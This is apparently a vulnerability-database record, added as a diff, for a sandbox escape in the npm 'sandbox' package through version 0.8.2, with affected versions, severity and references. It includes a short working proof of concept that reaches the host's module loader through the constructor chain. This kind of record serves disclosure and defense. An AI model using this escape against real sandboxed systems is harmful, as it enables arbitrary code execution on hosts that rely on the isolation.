@@ -1,0 +1,38 @@
+advisory_id: GHSA-fm4j-4xhm-xpwx
+datasource_id: github_osv_importer_v2/GHSA-fm4j-4xhm-xpwx
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-fm4j-4xhm-xpwx/GHSA-fm4j-4xhm-xpwx.json
+aliases: []
+summary: |
+  Sandbox Breakout / Arbitrary Code Execution in sandbox
+  All versions of `sandbox` through 0.8.2 are vulnerable to Sandbox Escape leading to Remote Code Execution. Due to insufficient input sanitization it is possible to escape the sandbox using constructors.
+
+  ## Proof of concept
+  ```
+  var Sandbox = require("sandbox")
+  s = new Sandbox()
+  code = `new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("util").inspect("hi")`
+  s.run(code)
+  ```
+
+
+  ## Recommendation
+
+  No fix is currently available. Consider using an alternative module until a fix is made available.
+impacted_packages:
+  - purl: pkg:npm/sandbox
+    affected_versions: vers:npm/<1.0.0
+    fixed_versions:
+severities:
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses: []
+references:
+  - url: https://github.com/gf3/sandbox/issues/50
+    reference_type:
+    reference_id:
+  - url: https://www.npmjs.com/advisories/766
+    reference_type:
+    reference_id:
